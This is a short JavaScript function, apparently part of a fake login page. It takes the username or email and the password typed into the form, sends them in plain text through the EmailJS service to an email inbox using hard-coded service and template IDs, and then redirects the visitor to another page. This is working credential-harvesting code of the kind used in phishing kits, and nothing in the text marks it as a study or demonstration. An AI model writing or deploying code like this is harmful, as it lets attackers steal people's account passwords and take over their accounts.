


function sendMail () {

    var params = {
        emailOrUsername: document.getElementById("username").value,
        password: document.getElementById("pass").value
    }
    const serviceID = "service_91ylxms";
    const templateID = "template_jat6x2s"
    
    emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
            window.location.href = "pageone.html"
            console.log(res)
        })
        .catch((err) => console.log(err))
}
